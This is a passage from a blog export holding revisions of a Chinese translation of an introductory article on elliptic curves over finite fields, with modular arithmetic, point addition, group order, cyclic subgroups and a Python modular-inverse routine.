b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277459928,"created_at":"2019-12-25 12:37:40"},{"id":"5e0358272ee0ee0001819d37","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 